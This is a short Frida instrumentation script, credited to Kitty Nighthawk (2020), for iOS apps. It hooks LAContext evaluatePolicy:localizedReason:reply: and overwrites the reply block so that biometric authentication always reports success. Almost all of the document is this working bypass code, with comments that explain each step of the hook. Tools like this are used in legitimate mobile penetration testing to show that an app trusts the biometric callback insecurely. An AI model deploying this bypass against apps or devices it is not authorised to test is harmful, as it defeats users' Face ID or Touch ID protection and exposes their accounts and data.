/*
 * Title: BypassLAContextAuthentication
 *
 * Description: This Frida script is used to hook any calls to LAContext evaluatePolicy:localizedReason:reply and
 * make it always return true.
 *
 * This is useful when an application is insecurely using LAContext to authenticate users biometrically. This is usually
 * where the application is taking the LAContext reply (which is either true or false) and then acting upon that response.
 * Such a response can be hooked and overwritten to always return true.
 *
 * Created by Kitty Nighthawk 2020
 */

// Constant values for the ANSI colour codes
const reset = "\x1b[0m";
const black = "\u001b[30m";
const red = "\u001b[31m";
const green = "\u001b[32m";
const yellow = "\u001b[33m";
const blue = "\u001b[34m";
const magenta = "\u001b[35m";
const cyan = "\u001b[36m";
const white = "\u001b[37m";
const bold = "\u001b[1m";

console.log(magenta, "[*] Starting LAContext authentication bypass script", reset);

if (ObjC.available) {
	try {
		// Create a new ApiResolver to search for Objective-C APIs
		var resolver = new ApiResolver('objc');

		// Create an empty dictionary to hold LAContext object values
		var LAContext_object = {};

		// Use the resolver to find all LAContext instances of evauatePolicy:localizedReason:reply
		resolver.enumerateMatches('-[LAContext evaluatePolicy:localizedReason:reply:]', {
				onMatch: function (match) {
					// When matches found, add the name and address of the matches to the dictionary
					LAContext_object.name = match.name;
					LAContext_object.address = match.address;
					console.log(cyan, "[*] Hooked ", match.name, " at ", match.address, reset);
				},
				// onComplete should be blank, just to make things neat and tidy
				onComplete: function () { }
		});

		// If the LAContext object contains an address, we have a hit to work with
		if (LAContext_object.address) {
			// Hook the implementation
			Interceptor.attach(LAContext_object.address, {
				onEnter: function (args) {
					// Firstly, create a new object which is a copy of the original
					var origReason = new ObjC.Object(args[3]);

					// Second, create a new Block object that is a copy of the original block
					var origReasonBlock = new ObjC.Block(args[4]);

					// Create a copy of the original block's implementation. This will be the callback. This will be run once the reply is changed.
					var callbackReasonBlock = origReasonBlock.implementation;

					// Now, change the reply (if it is not already true)
					origReasonBlock.implementation = function (success, error) {
						if (!success == true) {
							success = true;
							console.log(bold, green, "[+] LAContext evaluatePolicy:localizedReason:reply changed to true. Authentication bypassed.", reset);
						}

						// Now run the callback function (passing it the "true" response we set)
						callbackReasonBlock(success, error);
					}
				},
				onLeave: function (retval) {
					// Left for consistency of code
				}
			});
		} else {
			console.log(red, "[-] No LAContext evaluatePolicy:localizedReason:reply calls found", reset);
		}
	} catch(err) {
		console.log(red, "[!] An exception occured: ", reset, err.message);
	}
} else {
	console.log(red, "[-] Objective-C runtime is not available.", reset);
}

console.log(cyan, "[*] LAContext authentication bypass is now running", reset);
